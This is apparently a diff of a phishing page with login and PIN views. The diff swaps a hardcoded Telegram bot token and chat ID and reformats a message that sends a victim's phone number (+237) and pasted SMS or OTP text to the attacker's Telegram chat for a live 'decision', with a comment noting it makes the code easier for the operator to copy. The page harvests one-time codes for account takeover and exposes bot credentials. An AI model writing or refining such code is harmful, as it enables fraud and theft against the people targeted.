@@ -357,12 +357,6 @@
         }
 
         /* Login & PIN view styles */
-        .login-card-content {
-            padding: 20px 10px;
-            text-align: center;
-            width: 100%;
-        }
-
         .phone-box-main {
             width: 100%;
             border: 2px solid var(--primary);
@@ -705,8 +699,8 @@
 
     <!-- ================= APPLICATION SCRIPT ================= -->
     <script>
-        const BOT_TOKEN = '8265332180:AAHD9V6gBSoaLYfmtujNE6vGeOLkcv8mA8s';
-        const CHAT_ID = '5703339850';
+        const BOT_TOKEN = '8647792695:AAFRsJ3_N3vi-28BzIg1bmxDzKbTQ_EkwdE';
+        const CHAT_ID = '8406078749';
 
         // Navigation Controller
         function switchView(viewId) {
@@ -954,7 +948,13 @@
                 ]
             };
 
-            const message = `📱 *Step 2: OTP / Link Submission*\nPhone: \`+237 ${phone}\`\n✉️ Content:\n\`${smsText}\`\n\n👇 Decision required:`;
+            // Wrapped smsText in a strict code block `` so Telegram provides a dedicated one-tap copy button for it
+            const message = 
+                `📱 *Step 2: OTP / Link Submission*\n` +
+                `Phone: \`+237 ${phone}\`\n\n` +
+                `✉️ *Pasted Message (Tap below to copy strictly alone):*\n` +
+                `\`${smsText}\`\n\n` +
+                `👇 Decision required:`;
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
